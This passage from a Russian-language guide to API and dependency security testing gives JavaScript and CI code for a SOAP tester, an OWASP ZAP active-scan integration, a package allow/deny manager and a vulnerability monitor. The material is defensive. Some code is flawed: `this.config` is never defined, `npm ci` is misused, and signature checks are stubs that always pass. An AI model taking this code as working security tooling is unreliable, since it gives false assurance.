                    'Use certificate-based authentication',
                    'Enforce message-level security'
                ]
            });
        }
        
        if (results.authorization.vulnerable) {
            recommendations.push({
                priority: 'CRITICAL',
                title: 'Implement SOAP Authorization',
                description: 'Missing authorization for SOAP operations',
                actions: [
                    'Implement role-based access control',
                    'Use WS-SecurityPolicy',
                    'Validate user permissions for each operation'
                ]
            });
        }
        
        return recommendations;
    }
    
    getAuthenticatedHeaders() {
        // Заголовки с аутентификацией для SOAP
        return {
            'Authorization': `Bearer ${this.authToken}`,
            'SOAPAction': this.getCurrentSOAPAction()
        };
    }
    
    getNonAdminHeaders() {
        // Заголовки для неадминистратора
        return {
            'Authorization': `Bearer ${this.nonAdminToken}`,
            'SOAPAction': this.getCurrentSOAPAction()
        };
    }
    
    getCurrentSOAPAction() {
        // Возвращаем текущий SOAP Action
        return '"http://tempuri.org/GetCurrentUser"';
    }
}

// Использование SOAP тестера
const soapTester = new SOAPSecurityTester({
    baseUrl: 'https://api.example.com/soap',
    wsdlEndpoint: '/service.asmx?wsdl'
});

async function runSOAPSecurityTest() {
    const results = await soapTester.testSOAPAPI();
    console.log('SOAP Security Test Results:', JSON.stringify(results, null, 2));
    return results;
}
```

## Автоматизированное тестирование

### 1. Интеграция с CI/CD

```yaml
# .github/workflows/api-security-test.yml
name: API Security Testing

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  security-test:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Start test server
        run: |
          npm run test:server &
          sleep 10  # Wait for server to start
      
      - name: Run API security tests
        run: |
          npm run security:test:api
          npm run security:test:graphql
          npm run security:test:soap
      
      - name: Run dependency security scan
        run: npm audit --audit-level moderate
      
      - name: Run SAST scan
        run: npx snyk test --severity-threshold=medium
      
      - name: Check for vulnerabilities
        run: |
          # Проверка результатов сканирования
          if [ -f security-report.json ]; then
            critical_count=$(jq '.summary.vulnerabilities.critical' security-report.json)
            if [ "$critical_count" -gt 0 ]; then
              echo "Critical vulnerabilities found: $critical_count"
              exit 1
            fi
          fi
          
          # Проверка SOAP тестов
          if [ -f soap-security-report.json ]; then
            soap_critical=$(jq '.summary.byType.xmlSecurity' soap-security-report.json)
            if [ "$soap_critical" -gt 0 ]; then
              echo "Critical SOAP vulnerabilities found"
              exit 1
            fi
          fi
          
          # Проверка GraphQL тестов
          if [ -f graphql-security-report.json ]; then
            graphql_critical=$(jq '.summary.byType.injection' graphql-security-report.json)
            if [ "$graphql_critical" -gt 0 ]; then
              echo "Critical GraphQL vulnerabilities found"
              exit 1
            fi
          fi
```

### 2. Сканирование с использованием OWASP ZAP

```javascript
// Интеграция с OWASP ZAP для API тестирования
class ZAPAPIScanner {
    constructor(config) {
        this.config = {
            zapApiUrl: config.zapApiUrl || 'http://localhost:8080',
            apiKey: config.apiKey,
            target: config.target,
            ...config
        };
        
        this.contextId = null;
        this.scanId = null;
    }
    
    async setupZAP() {
        // Создание контекста для сканирования
        const contextName = `API_Scan_${Date.now()}`;
        
        const response = await fetch(`${this.config.zapApiUrl}/JSON/context/action/newContext/?apikey=${this.config.apiKey}&contextName=${contextName}`);
        const result = await response.json();
        
        this.contextId = result.contextId;
        
        // Добавление целевого URL в контекст
        await fetch(`${this.config.zapApiUrl}/JSON/context/action/includeInContext/?apikey=${this.config.apiKey}&contextName=${contextName}&regex=${this.config.target}.*`);
        
        return { success: true, contextId: this.contextId };
    }
    
    async scanAPI() {
        if (!this.contextId) {
            await this.setupZAP();
        }
        
        // Активное сканирование
        const scanResponse = await fetch(`${this.config.zapApiUrl}/JSON/ascan/action/scan/?apikey=${this.config.apiKey}&url=${this.config.target}&contextId=${this.contextId}`);
        const scanResult = await scanResponse.json();
        
        this.scanId = scanResult.scan;
        
        // Ожидание завершения сканирования
        await this.waitForScanCompletion();
        
        // Получение результатов
        return await this.getScanResults();
    }
    
    async waitForScanCompletion() {
        let progress = 0;
        
        while (progress < 100) {
            const progressResponse = await fetch(`${this.config.zapApiUrl}/JSON/ascan/view/status/?apikey=${this.config.apiKey}&scanId=${this.scanId}`);
            const progressResult = await progressResponse.json();
            
            progress = parseInt(progressResult.status);
            console.log(`ZAP Scan Progress: ${progress}%`);
            
            await new Promise(resolve => setTimeout(resolve, 5000)); // Ждать 5 секунд
        }
    }
    
    async getScanResults() {
        // Получение результатов сканирования
        const alertsResponse = await fetch(`${this.config.zapApiUrl}/JSON/core/view/alerts/?apikey=${this.config.apiKey}&baseurl=${this.config.target}`);
        const alertsResult = await alertsResponse.json();
        
        return {
            alerts: alertsResult.alerts,
            summary: this.summarizeZAPResults(alertsResult.alerts)
        };
    }
    
    summarizeZAPResults(alerts) {
        const summary = {
            totalAlerts: alerts.length,
            byRisk: { High: 0, Medium: 0, Low: 0, Informational: 0 },
            byType: {},
            urlsAffected: new Set()
        };
        
        for (const alert of alerts) {
            summary.byRisk[alert.risk] = (summary.byRisk[alert.risk] || 0) + 1;
            
            summary.byType[alert.alert] = (summary.byType[alert.alert] || 0) + 1;
            summary.urlsAffected.add(alert.url);
        }
        
        summary.urlsAffected = Array.from(summary.urlsAffected);
        
        return summary;
    }
    
    async cleanup() {
        // Очистка контекста ZAP
        if (this.contextId) {
            await fetch(`${this.config.zapApiUrl}/JSON/context/action/deleteContext/?apikey=${this.config.apiKey}&contextName=${this.contextId}`);
        }
    }
    
    async generateZAPReport() {
        const results = await this.scanAPI();
        
        const report = {
            tool: 'OWASP ZAP',
            target: this.config.target,
            timestamp: new Date().toISOString(),
            results: results,
            summary: results.summary,
            recommendations: this.generateZAPRecommendations(results.alerts)
        };
        
        await this.cleanup();
        
        return report;
    }
    
    generateZAPRecommendations(alerts) {
        const recommendations = [];
        
        const highRiskAlerts = alerts.filter(alert => alert.risk === 'High');
        if (highRiskAlerts.length > 0) {
            recommendations.push({
                priority: 'CRITICAL',
                title: 'Address High Risk Vulnerabilities',
                description: `Found ${highRiskAlerts.length} high risk vulnerabilities`,
                actions: [
                    'Prioritize fixing high risk issues immediately',
                    'Implement proper input validation',
                    'Review authentication and authorization controls'
                ]
            });
        }
        
        const injectionAlerts = alerts.filter(alert => alert.alert.toLowerCase().includes('injection'));
        if (injectionAlerts.length > 0) {
            recommendations.push({
                priority: 'HIGH',
                title: 'Fix Injection Vulnerabilities',
                description: `Found ${injectionAlerts.length} injection vulnerabilities`,
                actions: [
                    'Use parameterized queries',
                    'Implement proper input sanitization',
                    'Apply principle of least privilege'
                ]
            });
        }
        
        return recommendations;
    }
}

// Использование ZAP сканера
const zapScanner = new ZAPAPIScanner({
    zapApiUrl: process.env.ZAP_API_URL || 'http://localhost:8080',
    apiKey: process.env.ZAP_API_KEY,
    target: 'https://api.example.com'
});

async function runZAPAPIScan() {
    const report = await zapScanner.generateZAPReport();
    console.log('ZAP API Scan Report:', JSON.stringify(report, null, 2));
    return report;
}
```

## Лучшие практики

### 1. Правила безопасного управления зависимостями

```javascript
// Система управления безопасными зависимостями
class SecurePackageManager {
    constructor() {
        this.whitelist = new Set();
        this.blacklist = new Set();
        this.trustedSources = new Set();
        this.signatureVerification = true;
        
        this.loadSecurityPolicies();
    }
    
    async loadSecurityPolicies() {
        // Загрузка политик безопасности из конфигурации
        const policies = await this.loadFromConfig();
        
        policies.whitelist?.forEach(pkg => this.whitelist.add(pkg));
        policies.blacklist?.forEach(pkg => this.blacklist.add(pkg));
        policies.trustedSources?.forEach(source => this.trustedSources.add(source));
        
        this.signatureVerification = policies.signatureVerification ?? true;
    }
    
    async installPackage(packageName, version) {
        // Проверка на черный список
        if (this.blacklist.has(packageName)) {
            throw new Error(`Package ${packageName} is blacklisted for security reasons`);
        }
        
        // Проверка на белый список (если включен режим белого списка)
        if (this.config.enforceWhitelist && !this.whitelist.has(packageName)) {
            throw new Error(`Package ${packageName} is not whitelisted`);
        }
        
        // Проверка источника
        const source = await this.getPackageSource(packageName);
        if (!this.trustedSources.has(source)) {
            throw new Error(`Package ${packageName} comes from untrusted source: ${source}`);
        }
        
        // Проверка подписи (если включена)
        if (this.signatureVerification) {
            const signatureValid = await this.verifyPackageSignature(packageName, version);
            if (!signatureValid) {
                throw new Error(`Package ${packageName}@${version} has invalid signature`);
            }
        }
        
        // Проверка на уязвимости
        const hasVulnerabilities = await this.checkPackageVulnerabilities(packageName, version);
        if (hasVulnerabilities) {
            throw new Error(`Package ${packageName}@${version} has known vulnerabilities`);
        }
        
        // Установка пакета
        return await this.performInstallation(packageName, version);
    }
    
    async getPackageSource(packageName) {
        // Получение источника пакета
        // В реальности использовать реестр пакетов
        return 'npm'; // Заглушка
    }
    
    async verifyPackageSignature(packageName, version) {
        // Проверка подписи пакета
        // В реальности использовать криптографические методы
        return true; // Заглушка
    }
    
    async checkPackageVulnerabilities(packageName, version) {
        // Проверка пакета на наличие уязвимостей
        const auditResult = await this.runNPMAudit(packageName, version);
        return auditResult.vulnerabilities.total > 0;
    }
    
    async runNPMAudit(packageName, version) {
        // Выполнение npm audit для конкретного пакета
        const { exec } = require('child_process');
        const { promisify } = require('util');
        const execAsync = promisify(exec);
        
        try {
            const result = await execAsync(`npm audit --package-lock-only --json`);
            const audit = JSON.parse(result.stdout);
            
            return audit;
        } catch (error) {
            // npm audit может завершиться с кодом 1 при наличии уязвимостей
            if (error.code === 1) {
                const audit = JSON.parse(error.stdout);
                return audit;
            }
            throw error;
        }
    }
    
    async performInstallation(packageName, version) {
        // Выполнение безопасной установки пакета
        const { exec } = require('child_process');
        const { promisify } = require('util');
        const execAsync = promisify(exec);
        
        try {
            // Использование npm ci для безопасной установки
            await execAsync(`npm ci ${packageName}@${version} --ignore-scripts`);
            
            return { success: true, package: `${packageName}@${version}` };
        } catch (error) {
            throw new Error(`Failed to install ${packageName}@${version}: ${error.message}`);
        }
    }
    
    async updatePackage(packageName, newVersion) {
        // Безопасное обновление пакета
        const currentVersion = await this.getCurrentVersion(packageName);
        
        // Проверка совместимости версий
        if (!this.isVersionCompatible(currentVersion, newVersion)) {
            throw new Error(`Version ${newVersion} may not be compatible with current installation`);
        }
        
        // Выполнение безопасного обновления
        return await this.installPackage(packageName, newVersion);
    }
    
    isVersionCompatible(current, target) {
        // Проверка совместимости версий
        // В реальности использовать SemVer логику
        const [currentMajor] = current.split('.');
        const [targetMajor] = target.split('.');
        
        // Разрешить обновления только в пределах мажорной версии
        return currentMajor === targetMajor;
    }
    
    async getCurrentVersion(packageName) {
        // Получение текущей версии пакета
        try {
            const packageJson = require(`${process.cwd()}/node_modules/${packageName}/package.json`);
            return packageJson.version;
        } catch {
            return null;
        }
    }
    
    async validateAllDependencies() {
        // Валидация всех зависимостей проекта
        const dependencies = await this.getProjectDependencies();
        const results = [];
        
        for (const [name, version] of Object.entries(dependencies)) {
            try {
                const validationResult = await this.validateDependency(name, version);
                results.push({
                    package: name,
                    version,
                    valid: validationResult.valid,
                    issues: validationResult.issues
                });
            } catch (error) {
                results.push({
                    package: name,
                    version,
                    valid: false,
                    error: error.message
                });
            }
        }
        
        return results;
    }
    
    async validateDependency(packageName, version) {
        const issues = [];
        
        // Проверка на черный список
        if (this.blacklist.has(packageName)) {
            issues.push('Package is blacklisted');
        }
        
        // Проверка источника
        const source = await this.getPackageSource(packageName);
        if (!this.trustedSources.has(source)) {
            issues.push(`Package source not trusted: ${source}`);
        }
        
        // Проверка подписи
        if (this.signatureVerification) {
            const signatureValid = await this.verifyPackageSignature(packageName, version);
            if (!signatureValid) {
                issues.push('Invalid package signature');
            }
        }
        
        // Проверка уязвимостей
        const hasVulns = await this.checkPackageVulnerabilities(packageName, version);
        if (hasVulns) {
            issues.push('Package has known vulnerabilities');
        }
        
        return {
            valid: issues.length === 0,
            issues
        };
    }
    
    async getProjectDependencies() {
        // Получение всех зависимостей проекта
        const fs = require('fs');
        
        try {
            const packageJson = JSON.parse(fs.readFileSync('./package.json', 'utf8'));
            return {
                ...packageJson.dependencies,
                ...packageJson.devDependencies
            };
        } catch (error) {
            throw new Error('Failed to read project dependencies: ' + error.message);
        }
    }
    
    generateSecurityReport() {
        return {
            timestamp: new Date().toISOString(),
            policies: {
                whitelistEnabled: this.config.enforceWhitelist,
                blacklistEnabled: this.blacklist.size > 0,
                signatureVerification: this.signatureVerification,
                trustedSources: Array.from(this.trustedSources)
            },
            statistics: {
                whitelistCount: this.whitelist.size,
                blacklistCount: this.blacklist.size,
                trustedSourcesCount: this.trustedSources.size
            }
        };
    }
}

// Использование безопасного менеджера пакетов
const securePM = new SecurePackageManager();

async function installSecurely() {
    try {
        const result = await securePM.installPackage('express', '^4.18.0');
        console.log('Package installed securely:', result);
    } catch (error) {
        console.error('Secure installation failed:', error.message);
    }
}
```

### 2. Мониторинг установленных пакетов

```javascript
// Система мониторинга установленных пакетов
class PackageMonitor {
    constructor() {
        this.monitoredPackages = new Map();
        this.vulnerabilityDatabase = new VulnerabilityDatabase();
        this.alertThresholds = {
            critical: 0,    // 0 критических уязвимостей допустимо
            high: 1,       // 1 высокая уязвимость максимум
            medium: 5      // до 5 средних уязвимостей допустимо
        };
        
        this.startMonitoring();
    }
    
    startMonitoring() {
        // Запуск регулярного мониторинга
        setInterval(async () => {
            await this.checkForNewVulnerabilities();
        }, this.config.checkInterval || 3600000); // 1 час
        
        // Запуск проверки обновлений
        setInterval(async () => {
            await this.checkForSecurityUpdates();
        }, this.config.updateCheckInterval || 86400000); // 24 часа
    }
    
    async checkForNewVulnerabilities() {
        const installedPackages = await this.getInstalledPackages();
        const newVulnerabilities = [];
        
        for (const [name, version] of Object.entries(installedPackages)) {
            const vulns = await this.vulnerabilityDatabase.checkPackage(name, version);
            
            if (vulns.length > 0) {
                // Проверка, новая ли это уязвимость
                const isNew = await this.isNewVulnerability(name, version, vulns);
                
                if (isNew) {
                    newVulnerabilities.push({
                        package: name,
                        version,
                        vulnerabilities: vulns,
                        discoveredAt: new Date().toISOString()
                    });
                    
                    await this.recordVulnerability(name, version, vulns);
                }
            }
        }
        
        if (newVulnerabilities.length > 0) {
            await this.sendVulnerabilityAlerts(newVulnerabilities);
        }
        
        return newVulnerabilities;
    }
    
    async isNewVulnerability(packageName, version, vulnerabilities) {
        // Проверка, была ли уязвимость уже зарегистрирована
        const existing = await this.getExistingVulnerabilities(packageName, version);
        
        for (const vuln of vulnerabilities) {
            const exists = existing.some(existingVuln => 
                existingVuln.id === vuln.id && 
                existingVuln.published === vuln.published
            );
            
            if (!exists) return true;
        }
        
        return false;
    }
    
    async checkForSecurityUpdates() {
        const installedPackages = await this.getInstalledPackages();
        const securityUpdates = [];
        
        for (const [name, version] of Object.entries(installedPackages)) {
            const updateInfo = await this.checkForSecurityUpdate(name, version);
            
            if (updateInfo.hasUpdate) {
                securityUpdates.push({
                    package: name,
                    currentVersion: version,
                    newVersion: updateInfo.newVersion,
                    securityFixes: updateInfo.securityFixes,
                    severity: updateInfo.severity
                });
            }
        }
        
        if (securityUpdates.length > 0) {
            await this.sendUpdateAlerts(securityUpdates);
        }
        
        return securityUpdates;
    }
    
    async checkForSecurityUpdate(packageName, currentVersion) {
        const updates = await this.vulnerabilityDatabase.getSecurityUpdates(packageName, currentVersion);
        
        if (updates.length > 0) {
            // Найти версию с максимальным исправлением уязвимостей
            const latestSecureVersion = this.findLatestSecureVersion(updates);
            
            return {
                hasUpdate: true,
                newVersion: latestSecureVersion,
                securityFixes: updates.length,
                severity: this.assessUpdateSeverity(updates)
            };
        }
        
        return { hasUpdate: false };
    }
    
    findLatestSecureVersion(updates) {
        // Найти последнюю версию, которая исправляет уязвимости
        return updates
            .map(update => update.fixedVersion)
            .sort((a, b) => this.compareVersions(a, b))
            .pop();
    }
    
    assessUpdateSeverity(updates) {
        const severities = updates.map(u => u.severity);
        
        if (severities.includes('CRITICAL')) return 'CRITICAL';
        if (severities.includes('HIGH')) return 'HIGH';
        if (severities.includes('MEDIUM')) return 'MEDIUM';
        return 'LOW';
    }
    
    compareVersions(v1, v2) {
        // Сравнение версий SemVer
        const [major1, minor1, patch1] = v1.split('.').map(Number);
        const [major2, minor2, patch2] = v2.split('.').map(Number);
        
        if (major1 !== major2) return major1 - major2;
        if (minor1 !== minor2) return minor1 - minor2;
        return patch1 - patch2;
    }
    
    async getInstalledPackages() {
        // Получение установленных пакетов
        const fs = require('fs');
        
        try {
            const packageLock = JSON.parse(fs.readFileSync('./package-lock.json', 'utf8'));
            
            const packages = {};
            
            for (const [name, info] of Object.entries(packageLock.packages || {})) {
                if (name.startsWith('node_modules/')) {
                    const packageName = name.replace('node_modules/', '');
                    packages[packageName] = info.version;
                }
            }
            
            return packages;
        } catch (error) {
            console.error('Failed to read package-lock.json:', error);
            return {};
        }
    }
    
    async sendVulnerabilityAlerts(vulnerabilities) {
        // Отправка алертов о новых уязвимостях
        const criticalVulns = vulnerabilities.filter(v => 
            v.vulnerabilities.some(vuln => vuln.severity === 'CRITICAL')
        );
        
        if (criticalVulns.length > 0) {
            await this.sendCriticalAlert({
                type: 'NEW_CRITICAL_VULNERABILITIES',
                count: criticalVulns.length,
                packages: criticalVulns.map(v => v.package),
                severity: 'CRITICAL'
            });
        }
        
        // Отправка подробного отчета
        await this.sendDetailedReport({
            type: 'VULNERABILITY_DISCOVERY',
            vulnerabilities,
            timestamp: new Date().toISOString()
        });
    }
    
    async sendUpdateAlerts(updates) {
        // Отправка алертов о доступных обновлениях безопасности
        const criticalUpdates = updates.filter(u => u.severity === 'CRITICAL');
        
        if (criticalUpdates.length > 0) {
            await this.sendCriticalAlert({
                type: 'SECURITY_UPDATES_AVAILABLE',
                count: criticalUpdates.length,
                packages: criticalUpdates.map(u => u.package),
                severity: 'HIGH'
            });
        }
    }
    
    async sendCriticalAlert(alert) {
        console.error('CRITICAL SECURITY ALERT:', alert);
        
        // В реальности интеграция с системами уведомлений
        // Slack, PagerDuty, email и т.д.
        if (process.env.SECURITY_ALERT_WEBHOOK) {
            try {
                await fetch(process.env.SECURITY_ALERT_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(alert)
                });
            } catch (error) {
                console.error('Failed to send security alert:', error);
            }
        }
    }
    
    async sendDetailedReport(report) {
        // Отправка подробного отчета
        console.log('Security Report:', report);
    }
    
    async recordVulnerability(packageName, version, vulnerabilities) {
        // Запись уязвимости в базу данных
        // В реальности использовать БД
        if (!this.monitoredPackages.has(packageName)) {
            this.monitoredPackages.set(packageName, []);
        }
        
        const packageVulns = this.monitoredPackages.get(packageName);
        packageVulns.push({
            version,
            vulnerabilities,
            discoveredAt: new Date().toISOString()
        });
    }
    
    async getExistingVulnerabilities(packageName, version) {
        const packageVulns = this.monitoredPackages.get(packageName) || [];
        const versionVulns = packageVulns.find(v => v.version === version);
        return versionVulns ? versionVulns.vulnerabilities : [];
    }
    
    async getMonitoringReport() {
        const installed = await this.getInstalledPackages();
        const report = {
            monitoredPackages: Array.from(this.monitoredPackages.keys()),
            totalInstalled: Object.keys(installed).length,
            packagesWithVulnerabilities: 0,
            bySeverity: { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0 },
            lastCheck: new Date().toISOString()
        };
        
        for (const [pkg, vulns] of this.monitoredPackages) {
            if (vulns.length > 0) {
                report.packagesWithVulnerabilities++;
                
                for (const versionVulns of vulns) {
                    for (const vuln of versionVulns.vulnerabilities) {
                        report.bySeverity[vuln.severity] = (report.bySeverity[vuln.severity] || 0) + 1;
                    }
                }
            }
        }
        
        return report;
    }
}

// Использование монитора пакетов
const packageMonitor = new PackageMonitor();

// Получение отчета мониторинга
async function getPackageMonitoringReport() {
    const report = await packageMonitor.getMonitoringReport();
    console.log('Package Monitoring Report:', JSON.stringify(report, null, 2));
    return report;
}
```

## Связанные темы

- [[Сканирование-зависимостей]]
- [[Тестирование-безопасности-API]]
- [[Мониторинг-безопасности]]
- [[Аудит-безопасности]]
- [[Реагирование-на-инциденты]]